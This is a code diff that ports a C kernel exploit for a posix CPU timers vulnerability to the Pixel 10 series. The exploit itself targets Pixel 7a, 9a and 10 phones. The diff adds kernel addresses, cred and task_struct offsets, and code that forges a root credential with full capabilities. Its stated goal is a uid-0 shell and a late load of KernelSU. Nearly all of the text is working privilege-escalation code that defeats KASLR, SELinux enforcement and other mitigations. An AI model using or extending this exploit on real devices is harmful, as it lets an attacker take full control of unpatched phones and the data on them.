@@ -1,7 +1,8 @@
 /*
  * CVE-2026-98260 - posix cpu timers: uid-0 shell + KernelSU late-load
- * Target : Google Pixel 7a (lynx) / Pixel 9a (tegu), Android 14/16
+ * Target : Google Pixel 7a (lynx), Pixel 9a (tegu), Pixel 10 series
  * Kernel : 6.1.162-android14-11-g9dd05ae3a1de-ab16261587
+ *          6.6.127-android15-8-g91d825611104-ab16252310 (Pixel 10)
  * SELinux: Enforcing
  * Patches: absent (android14-6.1-sp fix 88d31f5e5a98 landed 2026-10-15)
  * Mitig. : KASLR=on SMEP=on SMAP=on PAN=on; KASAN compiled but disabled
@@ -9,8 +10,8 @@
  * Ported from the PLZ110 6.12.69 version.  The trigger mechanics are the
  * same; every build-dependent constant below comes from the factory
  * vmlinux (kallsyms/BTF) and /proc/slabinfo on the running device.  The
- * profile is selected at startup from the device property and page size,
- * so one binary handles lynx and both tegu kernel variants.
+ * profile is selected at startup from the kernel banner and page size, so
+ * one binary handles lynx, both tegu kernel variants and the Pixel 10.
  *
  * Two endgames:
  *
@@ -98,11 +99,25 @@ struct target_profile
     /* Plausible [min, max) range of the linear map on this VA layout. */
     unsigned long long linear_min;
     unsigned long long linear_max;
+    /* cred/task_struct layout (BTF). */
+    unsigned long long cred_uid_off;
+    unsigned long long cred_req;
+    unsigned long long cred_alloc;
+    unsigned long long cred_size;
+    unsigned long long task_cred_off;
+    /* Fake cred placement below the reclaimed k_itimer rb_node. */
+    unsigned long long fake_cred_off;
+    unsigned long long fake_caps_off;
+    unsigned long long fake_security_off;
+    unsigned long long fake_user_off;
+    unsigned long long fake_user_ns_off;
+    unsigned long long fake_ucounts_off;
+    unsigned long long fake_groups_off;
 };
 
 /* lynx 6.1.162, 4K pages (also used by tegu's stock boot.img).
  * do_timer_create+0xa8; posix_timers_cache object_size 264 (0x108),
- * order-1 slab, 31 objects. */
+ * order-1 slab, 31 objects.  cred is 0xb0 with a 4-byte usage. */
 static const struct target_profile profile_4k = {
     "4k", 4096UL, 12, 1, 8192UL,
     0xffffffc008192f7cULL, 0x192f7cULL,
@@ -111,6 +126,8 @@ static const struct target_profile profile_4k = {
     0xffffffc00a0305c0ULL, 0xffffffc00a030330ULL,
     0xffffffc00a031e48ULL, 0xffffffc00a0318e0ULL,
     0xffffff0000000000ULL, 0xffffffc000000000ULL,
+    0x4ULL, 0xb0ULL, 0xc0ULL, 0xb0ULL, 0x838ULL,
+    0x18ULL, 0x28ULL, 0x78ULL, 0x80ULL, 0x88ULL, 0x90ULL, 0x98ULL,
 };
 
 /* tegu kernel_16k, 16K pages.
@@ -124,6 +141,25 @@ static const struct target_profile profile_16k = {
     0xffffc0000a1195c0ULL, 0xffffc0000a119330ULL,
     0xffffc0000a11ae48ULL, 0xffffc0000a11a8e0ULL,
     0xffff000000000000ULL, 0xffffc00000000000ULL,
+    0x4ULL, 0xb0ULL, 0xc0ULL, 0xb0ULL, 0x838ULL,
+    0x18ULL, 0x28ULL, 0x78ULL, 0x80ULL, 0x88ULL, 0x90ULL, 0x98ULL,
+};
+
+/* Pixel 10 series (frankel/blazer/mustang/rango), 6.6.127, 4K pages.
+ * do_timer_create+0xa8 = 0xffffffc080195bac; the task_struct alloc in
+ * copy_process returns to 0xffffffc0800ab8bc.  posix_timers_cache is
+ * order-1/264 bytes again, but cred grew to 0xb8 (8-byte usage) and
+ * task_struct.cred moved to 0x820. */
+static const struct target_profile profile_6_6 = {
+    "6.6-4k", 4096UL, 12, 1, 8192UL,
+    0xffffffc080195bacULL, 0x195bacULL,
+    0xffffffc08237a0e8ULL, 0xffffffc08212ac0cULL,
+    0xab8bcULL,
+    0xffffffc08214efe0ULL, 0xffffffc08214ed50ULL,
+    0xffffffc082150ab0ULL, 0xffffffc082150540ULL,
+    0xffffff0000000000ULL, 0xffffffc000000000ULL,
+    0x8ULL, 0xb8ULL, 0xc0ULL, 0xb8ULL, 0x820ULL,
+    0x18ULL, 0x30ULL, 0x80ULL, 0x88ULL, 0x90ULL, 0x98ULL, 0xa0ULL,
 };
 
 static const struct target_profile *g_tgt;
@@ -150,15 +186,16 @@ static char g_kernel[256] = "unknown";
 #define INIT_UCOUNTS_STATIC (g_tgt->init_ucounts_static)
 #define INIT_GROUPS_STATIC (g_tgt->init_groups_static)
 
-/* cred_jar: sizeof(struct cred) = 0xb0, kmem_cache size 0xc0. */
+/* cred_jar: sizeof(struct cred) and kmem_cache size, from BTF. */
 #define TIMER_ALLOC 0x108ULL
-#define CRED_REQ 0xb0ULL
-#define CRED_ALLOC 0xc0ULL
+#define CRED_REQ (g_tgt->cred_req)
+#define CRED_ALLOC (g_tgt->cred_alloc)
+#define CRED_SIZE (g_tgt->cred_size)
 
-#define CRED_UID_OFF 0x4ULL
+#define CRED_UID_OFF (g_tgt->cred_uid_off)
 
-/* task_struct / cred layout on 6.1.162 (BTF). */
-#define OFF_TASK_CRED 0x838ULL
+/* task_struct / cred layout (BTF). */
+#define OFF_TASK_CRED (g_tgt->task_cred_off)
 #define TASK_ALLOC_BYTES 0x12c0ULL
 #define FULLCAP 0x1ffffffffffULL
 
@@ -184,17 +221,32 @@ static char g_kernel[256] = "unknown";
  * Placing the cred at node+0x18 avoids every write the erase performs:
  *     node[0]   = fake cred address (published as task->cred)
  *     node[0x10]= dest (outside the cred)
- *     node[0x20]= zeroed by the exit path -> cred.gid/suid, which must be 0
- * Cred field map (fake = node + 0x18):
+ *     node[0x20]= zeroed by the exit path -> a uid/gid word, which must be 0
+ *
+ * 6.1 cred (4-byte atomic usage), fake = node + 0x18:
  *     +0x00 usage  +0x04 uid    +0x08 gid    +0x0c suid
  *     +0x10 sgid   +0x14 euid   +0x18 egid   +0x1c fsuid
  *     +0x20 fsgid  +0x24 securebits
  *     +0x28..+0x50 cap_inh/prm/eff/bset/ambient
  *     +0x78 security +0x80 user +0x88 user_ns +0x90 ucounts +0x98 groups
- * uid is repaired by the later zero write at fake+4; euid and the caps are
- * never touched by the erase.
+ *
+ * 6.6 cred (8-byte usage), fake = node + 0x18:
+ *     +0x00 usage  +0x08 uid    +0x0c gid    +0x10 suid
+ *     +0x14 sgid   +0x18 euid   +0x1c egid   +0x20 fsuid
+ *     +0x24 fsgid  +0x28 securebits
+ *     +0x30..+0x58 cap_inh/prm/eff/bset/ambient
+ *     +0x80 security +0x88 user +0x90 user_ns +0x98 ucounts +0xa0 groups
+ *
+ * uid is repaired by the later zero write at fake+CRED_UID_OFF; euid and the
+ * caps are never touched by the erase.
  */
-#define FAKE_CRED_OFF 0x18ULL
+#define FAKE_CRED_OFF (g_tgt->fake_cred_off)
+#define FAKE_CAPS_OFF (g_tgt->fake_caps_off)
+#define FAKE_SECURITY_OFF (g_tgt->fake_security_off)
+#define FAKE_USER_OFF (g_tgt->fake_user_off)
+#define FAKE_USER_NS_OFF (g_tgt->fake_user_ns_off)
+#define FAKE_UCOUNTS_OFF (g_tgt->fake_ucounts_off)
+#define FAKE_GROUPS_OFF (g_tgt->fake_groups_off)
 
 #define CHILD_HELLO 0x52445931
 #define CHILD_MAGIC 0x50474552
@@ -1538,7 +1590,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
                              0x100, 0x0};
             int fit = 0;
 
-            if (p + 0xb0 > SLAB_SIZE)
+            if (p + CRED_SIZE > SLAB_SIZE)
             {
                 logf("[-] plant%d fake cred spills p=%#zx; retryable\n",
                      tag, p);
@@ -1555,7 +1607,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
 
                 if (b + 0x40 > SLAB_SIZE)
                     continue;
-                if (b + 0x40 <= off || cb + 0xb0 <= b)
+                if (b + 0x40 <= off || cb + CRED_SIZE <= b)
                 {
                     blob = b;
                     fit = 1;
@@ -1578,16 +1630,25 @@ static void run_plant(unsigned long long target, int tag, int mode,
              *   node[8]    = 0 (rb_right)
              *   node[0x10] = target (rb_left) -> compared against node
              * The erase then writes `target` at fake+8, and
-             * posix_cpu_timers_exit clears node+0x20 == fake+8, so gid/suid
-             * end up zero without any repair write.
+             * posix_cpu_timers_exit clears node+0x20 == fake+8, so the
+             * first uid word ends up zero without any repair write.
              *
-             * 6.1 cred layout (4-byte atomic usage), relative to fake:
+             * 6.1 cred (4-byte atomic usage), relative to fake:
              *   +0x00 usage  +0x04 uid    +0x08 gid    +0x0c suid
              *   +0x10 sgid   +0x14 euid   +0x18 egid   +0x1c fsuid
              *   +0x20 fsgid  +0x24 securebits
              *   +0x28..0x50 cap_inh/prm/eff/bset/ambient
              *   +0x78 security +0x80 user +0x88 user_ns +0x90 ucounts
              *   +0x98 group_info
+             *
+             * 6.6 cred (8-byte usage), relative to fake:
+             *   +0x00 usage  +0x08 uid    +0x0c gid    +0x10 suid
+             *   +0x14 sgid   +0x18 euid   +0x1c egid   +0x20 fsuid
+             *   +0x24 fsgid  +0x28 securebits
+             *   +0x30..0x58 cap_inh/prm/eff/bset/ambient
+             *   +0x80 security +0x88 user +0x90 user_ns +0x98 ucounts
+             *   +0xa0 group_info
+             *
              * usage=1 keeps the rb-node parent (pc & ~3) at NULL, so when
              * the exit loop reaches the fake cred as a second tree node,
              * rb_next() stops instead of chasing it as a parent.  It is
@@ -1595,27 +1656,32 @@ static void run_plant(unsigned long long target, int tag, int mode,
              * (node->__rb_parent_color = node) right after rb_erase(), so
              * the final usage is the low 32 bits of the fake address,
              * which is huge, before the child can ever put_cred() it.
-             * uid is repaired by the later zero write at fake+4; euid and
-             * the caps are never touched by the erase.
+             * uid is repaired by the later zero write at fake+CRED_UID_OFF;
+             * euid and the caps are never touched by the erase.
              */
             build_payload(payload, off, V + 0x78 + FAKE_CRED_OFF, target);
-            c[0] = 0x0000000000000001ULL; /* usage=1, uid=0 */
-            c[1] = 0; /* gid/suid: erase + exit zero them anyway */
-            c[2] = 0; /* sgid/euid: euid must stay 0 */
-            c[3] = 0; /* egid/fsuid */
-            c[4] = 0; /* fsgid/securebits */
-            for (int i = 5; i <= 9; i++)
-                c[i] = FULLCAP; /* inh/prm/eff/bset/ambient */
-            c[10] = 0; /* jit_keyring */
-            *(unsigned long long *)(payload + cb + 0x78) =
+            c[0] = 0x0000000000000001ULL; /* usage=1 */
+            c[1] = 0; /* uid/gid (6.6) or gid/suid (6.1) */
+            c[2] = 0; /* suid/sgid or sgid/euid */
+            c[3] = 0; /* euid/egid */
+            c[4] = 0; /* fsuid/fsgid, plus securebits on 6.1 */
+            {
+                size_t ci = FAKE_CAPS_OFF / 8;
+
+                if (ci > 5) /* 6.6: clear the securebits word separately */
+                    c[5] = 0;
+                for (int i = 0; i < 5; i++)
+                    c[ci + i] = FULLCAP; /* inh/prm/eff/bset/ambient */
+            }
+            *(unsigned long long *)(payload + cb + FAKE_SECURITY_OFF) =
                 page + blob; /* security */
-            *(unsigned long long *)(payload + cb + 0x80) =
+            *(unsigned long long *)(payload + cb + FAKE_USER_OFF) =
                 ROOT_USER_STATIC + g_slide;
-            *(unsigned long long *)(payload + cb + 0x88) =
+            *(unsigned long long *)(payload + cb + FAKE_USER_NS_OFF) =
                 INIT_USER_NS_STATIC + g_slide;
-            *(unsigned long long *)(payload + cb + 0x90) =
+            *(unsigned long long *)(payload + cb + FAKE_UCOUNTS_OFF) =
                 INIT_UCOUNTS_STATIC + g_slide;
-            *(unsigned long long *)(payload + cb + 0x98) =
+            *(unsigned long long *)(payload + cb + FAKE_GROUPS_OFF) =
                 INIT_GROUPS_STATIC + g_slide;
             for (int i = 0; i < 8; i++)
                 *(unsigned int *)(payload + blob + SELINUX_BLOB_OFF +
@@ -2163,10 +2229,11 @@ static int wait_child_main(const char *mode)
 
 /*
  * Pick the build profile from the running device.  The stock Pixel 7a
- * (lynx) and Pixel 9a (tegu) boot images both use the same 6.1.162 4K
- * kernel, so they share profile_4k.  Tegu also ships a 16K-page kernel
- * in its factory image; the userspace page size is the reliable way to
- * tell which one actually booted.
+ * (lynx) and Pixel 9a (tegu) boot images share the same 6.1.162 4K
+ * kernel, so they use profile_4k.  Tegu also ships a 16K-page kernel
+ * in its factory image; the userspace page size picks that one.  The
+ * Pixel 10 series ships a 6.6.127 4K kernel with a different cred and
+ * task_struct layout, selected by the kernel banner.
  */
 static void detect_target(void)
 {
@@ -2183,7 +2250,9 @@ static void detect_target(void)
         snprintf(g_device, sizeof(g_device), "%s", dev);
 
     ps = sysconf(_SC_PAGESIZE);
-    if (ps == 16384)
+    if (strstr(g_kernel, "6.6.127-android15-8-g91d825611104-ab16252310"))
+        g_tgt = &profile_6_6;
+    else if (ps == 16384)
         g_tgt = &profile_16k;
 
     logf("[+] device=%s kernel=%s pagesize=%ld profile=%s\n",
@@ -2207,7 +2276,7 @@ int main(int argc, char **argv)
     detect_target();
     /* Lets the app confirm a downloaded binary targets this exact build.
      * Keep target=lynx for the app's existing check; device picks the
-     * actual profile (Pixel 7a or Pixel 9a, 4K or 16K kernel). */
+     * actual profile (Pixel 7a/9a/10, 4K or 16K kernel). */
     if (argc > 1 && !strcmp(argv[1], "target"))
     {
         printf("target=lynx\ndevice=%s\nkernel=%s\npagesize=%lu\n"
